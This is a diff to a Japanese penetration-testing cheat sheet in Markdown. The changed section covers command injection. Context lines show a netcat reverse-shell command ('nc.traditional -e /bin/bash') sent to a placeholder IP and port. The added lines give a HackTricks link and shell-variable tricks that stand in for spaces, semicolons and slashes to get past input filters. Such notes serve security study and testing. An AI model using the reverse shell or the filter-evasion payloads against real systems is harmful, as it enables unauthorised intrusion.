@@ -103,6 +103,8 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names
 
 ## コマンドインジェクション（netcat でシェルを起動）
 
+highlight=command%20injection#what-is-command-injection
+
 ### １．攻撃マシンで Listen
 
 ```shell
@@ -122,6 +124,16 @@ nc.traditional -e /bin/bash <ip> <port>
 
 ```shell
 ping <ip> -c 3
+```
+
+### フィルター回避テクニック
+
+https://book.hacktricks.wiki/en/pentesting-web/command-injection.html?
+
+```sh
+${LS_COLORS:10:1} -> ;
+${IFS} -> space
+${HOME:0:1} -> /
 ```
 
 ## SQLmap
